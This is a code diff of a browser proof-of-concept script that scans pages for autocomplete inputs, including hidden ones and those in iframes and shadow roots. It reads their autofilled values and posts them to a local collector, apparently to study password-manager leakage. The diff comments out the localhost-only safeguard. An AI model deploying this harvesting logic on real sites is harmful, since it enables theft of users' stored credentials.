@@ -14,7 +14,7 @@
     window.TP_DEFAULT_ENABLE = false;      // start scanning enabled
     window.PWD_MANAGER = 'Chrome-built-in' // optional label for reports
 */
-(function(){
+(function () {
   const LOCAL_COLLECTOR = 'http://127.0.0.1:8088/collect';
   const SEND_VALUE_SAMPLE = (typeof window.TP_SEND_VALUE_SAMPLE === 'boolean') ? window.TP_SEND_VALUE_SAMPLE : true;
   const DEFAULT_INTERVAL = Number(window.TP_DEFAULT_INTERVAL_MS || 3000);
@@ -22,76 +22,82 @@
   const USER_TZ = 'Asia/Taipei';
 
   // build UI container
-  function h(tag, attrs={}, children=[]) {
+  function h(tag, attrs = {}, children = []) {
     const el = document.createElement(tag);
-    for (const [k,v] of Object.entries(attrs||{})) {
-      if (k==='style' && typeof v==='object') Object.assign(el.style, v);
-      else if (k==='text') el.textContent = v;
+    for (const [k, v] of Object.entries(attrs || {})) {
+      if (k === 'style' && typeof v === 'object') Object.assign(el.style, v);
+      else if (k === 'text') el.textContent = v;
       else el.setAttribute(k, v);
     }
-    for (const c of (children||[])) el.appendChild(typeof c === 'string' ? document.createTextNode(c) : c);
+    for (const c of (children || [])) el.appendChild(typeof c === 'string' ? document.createTextNode(c) : c);
     return el;
   }
 
-  const panel = h('section', { id:'tp-controls', class:'controls', style:{
-    fontFamily:'system-ui, -apple-system, Segoe UI, Roboto, Helvetica, Arial, sans-serif',
-    fontSize:'14px', lineHeight:'1.4', background:'#fcfffc', border:'1px solid #d7efd7', padding:'10px', margin:'12px 0'
-  }}, [
-    h('div', {style:{marginBottom:'6px', fontWeight:'600'}}, ['Third-party PoC Controls (local test only)']),
+  const panel = h('section', {
+    id: 'tp-controls', class: 'controls', style: {
+      fontFamily: 'system-ui, -apple-system, Segoe UI, Roboto, Helvetica, Arial, sans-serif',
+      fontSize: '14px', lineHeight: '1.4', background: '#fcfffc', border: '1px solid #d7efd7', padding: '10px', margin: '12px 0'
+    }
+  }, [
+    h('div', { style: { marginBottom: '6px', fontWeight: '600' } }, ['Third-party PoC Controls (local test only)']),
     h('label', {}, [
-      h('input', { id:'tp-enableExfil', type:'checkbox' }),
+      h('input', { id: 'tp-enableExfil', type: 'checkbox' }),
       ' Enable PoC exfiltration (send only to 127.0.0.1:8088)'
     ]),
     document.createTextNode('  \u00A0\u00A0'),
     h('label', {}, [
       'Interval: ',
-      (function(){
-        const sel = h('select', { id:'tp-intervalSel' }, [
-          h('option', { value:'1500' }, ['1.5s']),
-          h('option', { value:'3000', selected:'selected' }, ['3s']),
-          h('option', { value:'5000' }, ['5s']),
+      (function () {
+        const sel = h('select', { id: 'tp-intervalSel' }, [
+          h('option', { value: '1500' }, ['1.5s']),
+          h('option', { value: '3000', selected: 'selected' }, ['3s']),
+          h('option', { value: '5000' }, ['5s']),
         ]);
         sel.value = String(DEFAULT_INTERVAL);
         return sel;
       })()
     ]),
     document.createTextNode('  \u00A0\u00A0'),
-    h('button', { id:'tp-manualScan', type:'button', style:{marginRight:'8px'} }, ['Manual scan now']),
-    h('span', {style:{marginLeft:'8px'}}, ['Test ID: ']),
-    h('input', { id:'tp-testIdInput', type:'text', value:(function(){
-      if (window.TEST_ID) return window.TEST_ID;
-      const ymd = new Date().toISOString().slice(0,10).replace(/-/g,'');
-      return 'thirdParty_sameOrigin_' + ymd;
-    })(), style:{width:'240px'}}),
-    h('button', { id:'tp-applyTestId', type:'button', style:{marginLeft:'6px'} }, ['Apply']),
-    h('span', { id:'tp-testIdNow', style:{marginLeft:'10px', color:'#333'} }, []),
+    h('button', { id: 'tp-manualScan', type: 'button', style: { marginRight: '8px' } }, ['Manual scan now']),
+    h('span', { style: { marginLeft: '8px' } }, ['Test ID: ']),
+    h('input', {
+      id: 'tp-testIdInput', type: 'text', value: (function () {
+        if (window.TEST_ID) return window.TEST_ID;
+        const ymd = new Date().toISOString().slice(0, 10).replace(/-/g, '');
+        return 'thirdParty_sameOrigin_' + ymd;
+      })(), style: { width: '240px' }
+    }),
+    h('button', { id: 'tp-applyTestId', type: 'button', style: { marginLeft: '6px' } }, ['Apply']),
+    h('span', { id: 'tp-testIdNow', style: { marginLeft: '10px', color: '#333' } }, []),
   ]);
 
-  const logEl = h('pre', { id:'tp-log', style:{
-    background:'#f7f7f7', padding:'10px', border:'1px solid #eee',
-    maxHeight:'240px', overflow:'auto', margin:'6px 0 0 0'
-  }});
+  const logEl = h('pre', {
+    id: 'tp-log', style: {
+      background: '#f7f7f7', padding: '10px', border: '1px solid #eee',
+      maxHeight: '240px', overflow: 'auto', margin: '6px 0 0 0'
+    }
+  });
 
   // mount UI near top of body
-  (document.body ? Promise.resolve() : new Promise(r => addEventListener('DOMContentLoaded', r))).then(()=>{
+  (document.body ? Promise.resolve() : new Promise(r => addEventListener('DOMContentLoaded', r))).then(() => {
     document.body.appendChild(panel);
     document.body.appendChild(logEl);
     // initialize enable checkbox text
     document.getElementById('tp-enableExfil').checked = !!DEFAULT_ENABLE;
     updateTestIdLabel();
-    if (DEFAULT_ENABLE) startScanning(Number(document.getElementById('tp-intervalSel').value||3000));
+    if (DEFAULT_ENABLE) startScanning(Number(document.getElementById('tp-intervalSel').value || 3000));
     log('PoC loaded — start the collector on 127.0.0.1:8088, then enable PoC exfiltration if desired.');
   });
 
-  function updateTestIdLabel(){
+  function updateTestIdLabel() {
     const v = document.getElementById('tp-testIdInput').value.trim();
-    document.getElementById('tp-testIdNow').textContent = v ? ('Current Test ID: '+v) : '';
+    document.getElementById('tp-testIdNow').textContent = v ? ('Current Test ID: ' + v) : '';
     window.TEST_ID = v || window.TEST_ID || '';
   }
 
   // logging
   function log(msg) {
-    const t = new Date().toLocaleTimeString('en-US', { hour12:false });
+    const t = new Date().toLocaleTimeString('en-US', { hour12: false });
     logEl.textContent += `[${t}] ${msg}\n`;
     logEl.scrollTop = logEl.scrollHeight;
   }
@@ -122,7 +128,7 @@
         const nm = node.getAttribute && node.getAttribute('name');
         if (nm) part += `[name="${nm}"]`;
         else if (node.classList && node.classList.length) {
-          part += '.' + Array.from(node.classList).slice(0,2).join('.');
+          part += '.' + Array.from(node.classList).slice(0, 2).join('.');
         }
         const parent = node.parentNode;
         if (parent) {
@@ -141,7 +147,7 @@
 
   // hidden detection
   let lastUserTypeAt = 0;
-  document.addEventListener('input', () => lastUserTypeAt = Date.now(), {capture:true});
+  document.addEventListener('input', () => lastUserTypeAt = Date.now(), { capture: true });
   const USER_TYPE_GRACE_MS = 2000;
   function isHiddenEl(el) {
     try {
@@ -163,10 +169,10 @@
   function normalizeTechnique(raw) {
     if (!raw) return 'unknown';
     return String(raw).toLowerCase()
-             .replace(/[:\/\s,+]+/g,'-')
-             .replace(/[^a-z0-9\-()]/g,'')
-             .replace(/\-+/g,'-')
-             .replace(/^\-+|\-+$/g,'');
+      .replace(/[:\/\s,+]+/g, '-')
+      .replace(/[^a-z0-9\-()]/g, '')
+      .replace(/\-+/g, '-')
+      .replace(/^\-+|\-+$/g, '');
   }
 
   // collect inputs (document + same-origin iframes + known shadow host tags)
@@ -181,7 +187,7 @@
         const inputs = Array.from(idoc.querySelectorAll('input[autocomplete]'));
         inputs.forEach(inp => inp.___in_iframe = fr);
         out.push(...inputs);
-      } catch (e) {}
+      } catch (e) { }
     }
 
     const shadowHosts = Array.from(document.querySelectorAll('x-shadow-host, x-tp-shadow, x-shadow-host-thirdparty-cdn'));
@@ -192,7 +198,7 @@
         const inputs = Array.from(sr.querySelectorAll('input[autocomplete]'));
         inputs.forEach(inp => inp.___shadow_host = host);
         out.push(...inputs);
-      } catch (e) {}
+      } catch (e) { }
     }
     return out;
   }
@@ -229,16 +235,16 @@
           inputType: inp.type || null,
           autocomplete: ac
         });
-      } catch (e) {}
+      } catch (e) { }
     }
     return results;
   }
 
-  function isLocalHost() { return ['localhost','127.0.0.1'].includes(location.hostname); }
+  // function isLocalHost() { return true; }
 
   async function safePostLocal(url, envelope) {
-    if (!isLocalHost()) { log('Not local host; blocked sending.'); return { ok:false, status:'blocked-host' }; }
-    if (!url.startsWith(LOCAL_COLLECTOR)) { log('Collector URL must be ' + LOCAL_COLLECTOR); return { ok:false, status:'bad-url' }; }
+    // if (!isLocalHost()) { log('Not local host; blocked sending.'); return { ok: false, status: 'blocked-host' }; }
+    if (!url.startsWith(LOCAL_COLLECTOR)) { log('Collector URL must be ' + LOCAL_COLLECTOR); return { ok: false, status: 'bad-url' }; }
     const bodyStr = JSON.stringify(envelope);
     log('Sending payload: ' + bodyStr);
     try {
@@ -248,18 +254,18 @@
         body: bodyStr,
         keepalive: true
       });
-      const text = await res.text().catch(()=> '');
-      if (!res.ok) { log(`Collector non-2xx: ${res.status} ${res.statusText} ${text}`); return { ok:false, status: res.status, text }; }
+      const text = await res.text().catch(() => '');
+      if (!res.ok) { log(`Collector non-2xx: ${res.status} ${res.statusText} ${text}`); return { ok: false, status: res.status, text }; }
       log('Collector OK: ' + (text || '(no body)'));
-      return { ok:true, status: res.status, text };
+      return { ok: true, status: res.status, text };
     } catch (e) {
-      log('Send failed: ' + String(e)); return { ok:false, status:'network-error', err: String(e) };
+      log('Send failed: ' + String(e)); return { ok: false, status: 'network-error', err: String(e) };
     }
   }
 
   function redactValue(v) {
     if (v === undefined || v === null) return '';
-    const s = String(v); return s.length > 200 ? s.slice(0,200) : s;
+    const s = String(v); return s.length > 200 ? s.slice(0, 200) : s;
   }
 
   async function exfiltrateOnce() {
@@ -273,14 +279,14 @@
     const trialNum = window._POC_TRIALS[testId];
 
     for (const f of found) {
-      try { f.node.dataset.exfiltrated = '1'; } catch (e) {}
+      try { f.node.dataset.exfiltrated = '1'; } catch (e) { }
       const now = new Date();
       const local_ts = new Intl.DateTimeFormat('sv-SE', {
-        year:'numeric', month:'2-digit', day:'2-digit',
-        hour:'2-digit', minute:'2-digit', second:'2-digit',
-        hour12:false, timeZone: USER_TZ
-      }).format(now).replace('T',' ');
-      const timestamp_utc = (new Date()).toISOString().replace(/\.\d+Z$/,'Z');
+        year: 'numeric', month: '2-digit', day: '2-digit',
+        hour: '2-digit', minute: '2-digit', second: '2-digit',
+        hour12: false, timeZone: USER_TZ
+      }).format(now).replace('T', ' ');
+      const timestamp_utc = (new Date()).toISOString().replace(/\.\d+Z$/, 'Z');
 
       const payload = {
         timestamp_utc,
@@ -289,8 +295,8 @@
         trial: trialNum,
         scenario: (f.node && f.node.___in_iframe) ? 'iframe' : 'in-document',
         injected_by: (f.node && f.node.dataset && f.node.dataset.provenance) ? f.node.dataset.provenance :
-                     (f.node && f.node.closest && f.node.closest('[data-injected-by]')) ?
-                     (f.node.closest('[data-injected-by]').getAttribute('data-injected-by')) : 'static-html',
+          (f.node && f.node.closest && f.node.closest('[data-injected-by]')) ?
+            (f.node.closest('[data-injected-by]').getAttribute('data-injected-by')) : 'static-html',
         browser: uaInfo.browser,
         password_manager: window.PWD_MANAGER || 'unknown',
         field_name: f.name || null,
@@ -337,10 +343,10 @@
   });
   document.addEventListener('change', (e) => {
     if (e.target && e.target.id === 'tp-enableExfil') {
-      if (e.target.checked) startScanning(parseInt(document.getElementById('tp-intervalSel').value,10));
+      if (e.target.checked) startScanning(parseInt(document.getElementById('tp-intervalSel').value, 10));
       else stopScanning();
     } else if (e.target && e.target.id === 'tp-intervalSel') {
-      if (document.getElementById('tp-enableExfil').checked) startScanning(parseInt(e.target.value,10));
+      if (document.getElementById('tp-enableExfil').checked) startScanning(parseInt(e.target.value, 10));
     }
   });
 
